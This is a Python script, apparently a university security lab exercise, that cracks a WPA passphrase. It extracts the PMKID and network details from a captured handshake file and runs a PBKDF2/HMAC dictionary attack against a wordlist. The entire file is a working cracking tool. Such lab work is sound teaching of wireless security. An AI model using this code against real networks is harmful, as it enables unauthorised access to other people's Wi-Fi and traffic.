#!/usr/bin/env python
# -*- coding: utf-8

"""
Crack PMKID from first 4-way handshake info

Dictionary attack on PMKID to crack the passphrase.
"""

__author__      = "Diego Villagrasa, Fabio Marques"
__copyright__   = "Copyright 2021, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "2.0"
__email__ 		= "diego.villagrasa@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import hexlify, a2b_hex
from pbkdf2 import *
import hmac, hashlib

wpa=rdpcap("PMKID_handshake.pcap")

"""
Dictionary attack to crack the passphrase
@param pmkid pmkid from 4-way handshake
@param ssid correspondig ssid
@param mac_ap mac address of the access point
@param mac_sta mac address of the station trying to connect to the a
@returns the passphrase if found or None
"""
def get_passphrase(pmkid, ssid, mac_ap, mac_sta):
    # format data
    ssid = ssid.encode()
    mac_ap = a2b_hex(mac_ap.replace(':', ''))
    mac_sta = a2b_hex(mac_sta.replace(':', ''))
    pmkid = pmkid.decode('utf-8')

    with open("wordlist.txt") as f:
        for line in f:
            passphrase = line.replace('\n', '').encode()
            # generate pmk with a passphrase from the wordlist
            pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
            # generate pmkid related to the actual passphrase
            pmkid_calc = hmac.new(pmk, b"PMK Name" + mac_ap + mac_sta, hashlib.sha1).hexdigest()[:32]

            # if they match it means we got the right passphrase
            if (pmkid == pmkid_calc):
                return passphrase
    return None

ssids = {} # dictionary of all found mac_ap related to their ssid
found_macs = {} # dictionary of all processed mac_ap

print("\nCracking Wifis with PMKID")
print("=========================\n")
for pkt in wpa:
    # check if we can find a ssid
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
        # add the current mac_ap allong with is ssid to our ssids dictionary
        if pkt.addr2 not in ssids:
            ssids[pkt.addr2] = pkt.info.decode('ascii')

    # check if is a 4-way handshake
    if pkt.haslayer(EAPOL):
        # parse needed data
        mac_ap = pkt[Dot11].addr2
        mac_sta = pkt[Dot11].addr1
        pmkid = hexlify(pkt.getlayer(Raw).load)[202:234]

        # check if it's a valid pmkid
        if pmkid != '00000000000000000000000000000000' and pmkid != '':
            # if we cannot find the mac_ap inside ssids it means we cannot proced
            # also if mac_ap inside found_macs it means we already tried that mac
            if mac_ap in ssids and mac_ap not in found_macs:
                # that way we know we already tried that mac
                found_macs[mac_ap] = ssids[mac_ap]
                # bruteforce the passphrase
                passphrase = get_passphrase(pmkid, ssids[mac_ap], mac_ap, mac_sta)

                print("ssid:\t", ssids[mac_ap])
                print("passphrase:\t", passphrase, "\n")